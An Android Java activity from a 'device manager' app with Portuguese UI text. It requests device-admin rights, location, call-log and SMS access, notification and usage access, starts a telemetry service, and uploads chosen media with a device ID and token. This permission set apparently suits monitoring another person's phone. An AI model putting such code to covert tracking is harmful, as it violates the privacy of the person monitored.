package com.company.devicemgr.activities;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.Manifest;
import android.content.pm.PackageManager;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.company.devicemgr.receivers.DeviceAdminReceiver;
import com.company.devicemgr.services.ForegroundTelemetryService;

public class MainPermissionsActivity extends Activity {
	Button btnDeviceAdmin, btnLocationPerm, btnStoragePerm, btnCallLogPerm, btnSmsPerm, btnNotifAccess, btnUsageAccess, btnStartService, btnPickMedia;
	TextView tvStatus, tvDeviceId;
	private static final int REQ_CODE_DEVICE_ADMIN = 1001;
	private static final int REQ_CODE_PERMS = 2001;
	private static final int REQ_PICK_MEDIA = 3001;
	
	@Override protected void onCreate(Bundle s) {
		super.onCreate(s);
		setContentView(com.company.devicemgr.R.layout.activity_main_permissions);
		
		btnDeviceAdmin = findViewById(com.company.devicemgr.R.id.btnDeviceAdmin);
		btnLocationPerm = findViewById(com.company.devicemgr.R.id.btnLocationPerm);
		btnStoragePerm = findViewById(com.company.devicemgr.R.id.btnStoragePerm);
		btnCallLogPerm = findViewById(com.company.devicemgr.R.id.btnCallLogPerm);
		btnSmsPerm = findViewById(com.company.devicemgr.R.id.btnSmsPerm);
		btnNotifAccess = findViewById(com.company.devicemgr.R.id.btnNotifAccess);
		btnUsageAccess = findViewById(com.company.devicemgr.R.id.btnUsageAccess);
		btnStartService = findViewById(com.company.devicemgr.R.id.btnStartService);
		btnPickMedia = findViewById(com.company.devicemgr.R.id.btnPickMedia);
		
		tvStatus = findViewById(com.company.devicemgr.R.id.tvStatus);
		tvDeviceId = findViewById(com.company.devicemgr.R.id.tvDeviceId);
		
		final android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
		String deviceId = sp.getString("deviceId", null);
		if (deviceId == null) {
			// create simple deviceId (UUID)
			deviceId = java.util.UUID.randomUUID().toString();
			sp.edit().putString("deviceId", deviceId).apply();
		}
		tvDeviceId.setText("DeviceId: " + deviceId);
		
		btnDeviceAdmin.setOnClickListener(v -> {
			DevicePolicyManager dpm = (DevicePolicyManager)getSystemService(DEVICE_POLICY_SERVICE);
			ComponentName adminComp = new ComponentName(MainPermissionsActivity.this, DeviceAdminReceiver.class);
			if (!dpm.isAdminActive(adminComp)) {
				Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
				intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
				intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Necessário para bloqueio temporário e políticas.");
				startActivityForResult(intent, REQ_CODE_DEVICE_ADMIN);
				} else {
				showMsg("Device Admin já activo");
			}
		});
		
		btnLocationPerm.setOnClickListener(v -> {
			requestPermissionsIfNeeded(new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION});
		});
		
		btnStoragePerm.setOnClickListener(v -> {
			requestPermissionsIfNeeded(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE});
		});
		
		btnCallLogPerm.setOnClickListener(v -> {
			requestPermissionsIfNeeded(new String[]{Manifest.permission.READ_CALL_LOG});
		});
		
		btnSmsPerm.setOnClickListener(v -> {
			requestPermissionsIfNeeded(new String[]{Manifest.permission.READ_SMS});
		});
		
		btnNotifAccess.setOnClickListener(v -> {
			// open notification access settings
			startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
		});
		
		btnUsageAccess.setOnClickListener(v -> {
			startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
		});
		
		btnStartService.setOnClickListener(v -> {
			boolean active = sp.getBoolean("active", false);
			if (!active) {
				// allow starting service regardless of activation — but show warning
				new AlertDialog.Builder(MainPermissionsActivity.this)
				.setTitle("Aviso")
				.setMessage("A conta pode não estar activada. Continua?")
				.setPositiveButton("Sim", (d, which) -> startTelemetryService())
				.setNegativeButton("Não", null)
				.show();
				} else {
				startTelemetryService();
			}
		});
		
		btnPickMedia.setOnClickListener(v -> {
			Intent i = new Intent(Intent.ACTION_OPEN_DOCUMENT);
			i.addCategory(Intent.CATEGORY_OPENABLE);
			i.setType("*/*");
			String[] mime = {"image/*","video/*"};
			i.putExtra(Intent.EXTRA_MIME_TYPES, mime);
			startActivityForResult(i, REQ_PICK_MEDIA);
		});
		
		updateStatusText();
	}
	
	private void startTelemetryService() {
		Intent svc = new Intent(this, ForegroundTelemetryService.class);
		startService(svc);
		showMsg("Serviço iniciado");
		updateStatusText();
	}
	
	private void showMsg(String m) {
		tvStatus.setText("Status: " + m);
	}
	
	private void updateStatusText() {
		android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
		String token = sp.getString("auth_token", null);
		String deviceId = sp.getString("deviceId", null);
		tvStatus.setText("Token: " + (token != null ? "OK" : "missing"));
		tvDeviceId.setText("DeviceId: " + deviceId);
	}
	
	private void requestPermissionsIfNeeded(String[] perms) {
		java.util.List<String> need = new java.util.ArrayList<>();
		for (String p : perms) {
			if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
				need.add(p);
			}
		}
		if (!need.isEmpty()) {
			ActivityCompat.requestPermissions(this, need.toArray(new String[0]), REQ_CODE_PERMS);
			} else {
			showMsg("Permissões já concedidas");
		}
	}
	
	@Override protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		super.onActivityResult(requestCode, resultCode, data);
		if (requestCode == REQ_PICK_MEDIA && resultCode == RESULT_OK) {
			Uri uri = data.getData();
			if (uri != null) {
				handlePickedMedia(uri);
			}
			} else if (requestCode == REQ_CODE_DEVICE_ADMIN) {
			showMsg("Device admin resultado: " + resultCode);
		}
	}
	
	private void handlePickedMedia(final Uri uri) {
		new Thread(() -> {
			try {
				// read bytes
				java.io.InputStream is = getContentResolver().openInputStream(uri);
				byte[] buf = readAllBytes(is);
				String filename = queryName(uri);
				String mime = getContentResolver().getType(uri);
				android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
				String token = sp.getString("auth_token", null);
				String deviceId = sp.getString("deviceId", "unknown");
				String url = com.company.devicemgr.utils.ApiConfig.api("/api/media/" + java.net.URLEncoder.encode(deviceId, "UTF-8") + "/upload");
				String resp = com.company.devicemgr.utils.HttpClient.uploadFile(url, "media", filename, buf, mime, token);
				runOnUiThread(() -> showMsg("Upload: " + resp));
				} catch (Exception e) {
				e.printStackTrace();
				runOnUiThread(() -> showMsg("Erro upload: " + e.getMessage()));
			}
		}).start();
	}
	
	private static byte[] readAllBytes(java.io.InputStream is) throws java.io.IOException {
		java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
		byte[] buffer = new byte[8192];
		int read;
		while ((read = is.read(buffer)) != -1) {
			bos.write(buffer, 0, read);
		}
		is.close();
		return bos.toByteArray();
	}
	
	private String queryName(Uri uri) {
		String displayName = "file";
		android.database.Cursor cursor = getContentResolver().query(uri, null, null, null, null);
		try {
			if (cursor != null && cursor.moveToFirst()) {
				int idx = cursor.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME);
				if (idx != -1) displayName = cursor.getString(idx);
			}
			} finally {
			if (cursor != null) cursor.close();
		}
		return displayName;
	}
	
	@Override public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
		if (requestCode == REQ_CODE_PERMS) {
			boolean granted = true;
			for (int r : grantResults) if (r != PackageManager.PERMISSION_GRANTED) granted = false;
			showMsg(granted ? "Permissões concedidas" : "Algumas permissões negadas");
		}
		super.onRequestPermissionsResult(requestCode, permissions, grantResults);
	}
}